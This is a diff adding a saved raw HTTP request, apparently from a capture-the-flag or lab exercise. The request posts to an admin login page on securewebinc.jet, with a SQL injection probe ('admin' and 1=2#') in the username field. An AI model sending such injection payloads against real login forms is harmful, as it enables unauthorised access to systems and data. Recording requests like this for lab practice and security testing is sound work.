@@ -1,0 +1,17 @@
+POST /dirb_safe_dir_rf9EmcEIx/admin/dologin.php HTTP/1.1
+Host: www.securewebinc.jet
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 61
+Origin: http://www.securewebinc.jet
+DNT: 1
+Connection: keep-alive
+Cookie: PHPSESSID=ngtfvev900msqjaskkkj2pdoc0
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+username=admin' and 1=2#&password=test
